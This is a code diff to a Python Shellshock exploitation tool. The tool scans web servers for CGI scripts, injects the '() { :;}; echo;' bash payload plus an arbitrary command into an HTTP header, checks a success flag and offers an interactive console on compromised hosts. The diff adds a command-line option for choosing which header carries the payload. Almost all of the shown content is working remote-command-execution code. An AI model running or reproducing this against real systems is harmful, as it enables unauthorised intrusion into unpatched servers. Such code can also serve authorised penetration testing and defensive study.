@@ -61,9 +61,9 @@ sys.stdout = Unbuffered(sys.stdout)
 
 # Dictionary {header:attack string} to try on discovered CGI scripts
 # Where attack string comprises exploit + success_flag + command
-attacks = {
-   "Content-type": "() { %3a;}; echo; "
-   }
+attacks = [
+   "() { %3a;}; echo; "
+   ]
     
 
 # User-agent to use instead of 'Python-urllib/2.6' or similar
@@ -185,7 +185,7 @@ def do_check_cgi(req, q, verbose):
     finally:
         thread_pool.release()
 
-def do_exploit_cgi(proxy, target_list, command, verbose):
+def do_exploit_cgi(proxy, target_list, header, command, verbose):
     """ For urls identified as potentially exploitable attempt to exploit
     """
 
@@ -207,7 +207,7 @@ def do_exploit_cgi(proxy, target_list, command, verbose):
     for target in target_list:
         if verbose: print "[+] Trying exploit for %s" % target 
         if verbose: print "[I] Flag set to: %s" % success_flag
-        for header, exploit in attacks.iteritems():
+        for exploit in attacks:
             attack = exploit + " echo " + success_flag + "; " + command
             result = do_attack(proxy, target, header, attack, verbose)
             if success_flag in result:
@@ -238,11 +238,12 @@ def do_attack(proxy, target, header, attack, verbose):
             print "[I] Header is: %s" % header
             print "[I] Attack string is: %s" % attack
         req = urllib2.Request(target)
+        # User-Agent is overwritten if it is supplied as the attacker header
+        req.add_header("User-Agent", user_agent)
         req.add_header(header, attack)
         if proxy:
             req.set_proxy(proxy, "http")    
             if verbose: print "[I] Proxy set to: %s" % str(proxy)
-        req.add_header("User-Agent", user_agent)
         req.add_header("Host", host)
         resp = urllib2.urlopen(req)
         result =  resp.read()
@@ -448,6 +449,11 @@ def main():
         help = "Use SSL (default=False)"
         )
     parser.add_argument(
+        '--header',
+        default = "Content-type",
+        help = "Header to use (default=Content-type)"
+        )
+    parser.add_argument(
         '--threads',
         '-t',
         type = int,
@@ -472,6 +478,7 @@ def main():
         print "[-] No valid targets provided, exiting..."
         exit (0)
     port = str(args.port)
+    header = args.header
     if args.proxy is not None:
         proxy = args.proxy
     else:
@@ -502,7 +509,7 @@ def main():
 
     # If any cgi scripts were found on the target host try to exploit them
     if len(target_list):
-        successful_targets = do_exploit_cgi(proxy, target_list, command, verbose)
+        successful_targets = do_exploit_cgi(proxy, target_list, header, command, verbose)
         if len(successful_targets):
             ask_for_console(proxy, successful_targets, verbose)
         else:
